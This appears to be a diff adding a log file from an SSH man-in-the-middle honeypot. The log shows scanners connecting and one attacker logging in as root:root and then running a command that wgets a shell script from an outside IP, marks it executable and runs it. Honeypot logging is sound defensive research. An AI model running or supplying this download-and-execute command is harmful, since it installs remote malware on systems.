@@ -1,0 +1,23 @@
+2020-11-17 02:52:13.460 - [Info] MITM Version: 1.26
+2020-11-17 02:52:13.464 - [Info] Auto Access Enabled: true
+2020-11-17 02:52:13.465 - [Debug] [Init] Auto Access Barrier: true
+2020-11-17 02:52:13.477 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-11-17 04:07:08.656 - [Debug] [Connection] Attacker connected: 185.239.242.8 | Client Identification: SSH-2.0-libssh-0.1
+2020-11-17 04:07:08.750 - [Debug] [Connection] Attacker closed the connection
+2020-11-17 05:25:25.324 - [Debug] [Connection] Attacker connected: 192.35.168.112 | Client Identification: SSH-2.0-Go
+2020-11-17 05:25:30.324 - [Debug] [Connection] Attacker closed the connection
+2020-11-17 06:43:11.847 - [Debug] [Connection] Attacker connected: 104.248.27.36 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-17 06:43:12.736 - [Debug] [Auth] Attacker 104.248.27.36 trying to authenticate with "password"
+2020-11-17 06:43:12.737 - [Debug] [Auto Access] Attacker: 104.248.27.36, Threshold: 1, Attempts: 1
+2020-11-17 06:43:12.737 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-17 06:43:12.737 - [Debug] [Auto Access] Adding the following credentials: "root:root"
+2020-11-17 06:43:12.842 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-17 06:43:12.842 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-11-17 06:43:14.482 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-17 06:43:14.837 - [Debug] [EXEC] Noninteractive mode attacker command: wget http://198.23.209.128/bin.sh; chmod +x bin.sh; sh bin.sh
+2020-11-17 06:44:15.550 - [Debug] [Connection] Client error on ssh server
+2020-11-17 06:44:15.550 - [Debug] [Connection] Attacker closed connection
+2020-11-17 06:44:15.555 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-17 06:44:15.556 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-17 06:48:15.833 - [Info] Exiting...
+2020-11-17 06:48:15.834 - [Debug] Cleaning up...
